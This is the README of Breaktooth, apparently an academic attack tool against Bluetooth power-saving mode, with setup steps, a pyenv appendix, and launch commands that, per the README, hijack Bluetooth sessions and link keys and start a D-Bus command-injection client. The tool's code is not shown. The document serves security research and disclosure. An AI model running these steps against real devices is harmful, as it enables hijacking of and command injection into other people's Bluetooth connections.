# [Breaktooth](https://breaktooth.dev/): Breaking Security & Privacy in Bluetooth Power-Saving Mode


<p align="center">
  <img src="https://github.com/user-attachments/assets/cab4e077-4eae-42b3-a7f0-0e08da7b0d78" alt="description">
</p>

## Table of Contents

- [System requirements](#system-requirements)
- [Setup](#setup)
- [How to launch Breaktooth](#how-to-launch-breaktooth)
- [Appendix](#appendix)

## System requirements

- [Raspberry Pi OS (bullseye) 32bit](https://downloads.raspberrypi.com/raspios_oldstable_armhf/images/raspios_oldstable_armhf-2023-10-10/2023-05-03-raspios-bullseye-armhf.img.xz) (required)

- Python 3.9.2 (recommended)

[Back to top](#breaktooth-breaking-bluetooth-sessions-abusing-power-saving-mode)

## Setup

```sh
# If your raspberry pi has already been installed golang, please execute the following command.
$ make install/deps
```

[Back to top](#breaktooth-breaking-bluetooth-sessions-abusing-power-saving-mode)

## How to launch Breaktooth

Before launching Breaktooth, please run the following command and setup your Raspberry Pi.

```sh
$ bluetoothctl
>> agent off
>> agent NoInputNoOutput
>> default-agent
```

```sh
# The following command
$ make setup/device MAC=00:11:22:33:44:55 NAME="Bob" TARGET=AA:BB:CC:DD:EE:FF

# The following command performs a sequence of attacks that initiates sleep detection, hijacks the Bluetooth sessions and link key and starts the D-Bus server for command injection attacks.
# Please note that when hijacking the link key, a pop-up will appear on both the master and the slave asking whether you accept pairing or not.
$ make breaktooth

# The following command starts the D-Bus client for command injection attacks.
$ make boot/injector
```

[Back to top](#breaktooth-breaking-bluetooth-sessions-abusing-power-saving-mode)

## Appendix

### How to install `pyenv`

```sh
# install&setup pyenv
$ sudo apt update

$ sudo apt install build-essential libffi-dev libssl-dev zlib1g-dev liblzma-dev libbz2-dev libreadline-dev libsqlite3-dev libopencv-dev tk-dev git

$ git clone https://github.com/pyenv/pyenv.git ~/.pyenv

$ echo '' >> ~/.bashrc

$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc

$ echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc

$ echo 'eval "$(pyenv init --path)"' >> ~/.bashrc

$ source ~/.bashrc

# install python 3.9.2
$ pyenv install 3.9.2

$ pyenv global 3.9.2
```

[Back to top](#breaktooth-breaking-bluetooth-sessions-abusing-power-saving-mode)
